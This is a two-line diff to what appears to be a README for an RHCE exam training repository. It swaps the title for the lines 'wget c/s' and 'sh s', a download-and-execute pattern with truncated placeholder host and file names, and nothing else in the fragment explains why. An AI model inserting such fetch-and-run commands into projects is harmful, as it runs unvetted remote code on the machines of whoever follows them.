@@ -1,2 +1,2 @@
-# Rhce-exam-training
-RHCE EXAM Training 
+wget c/s 
+sh s
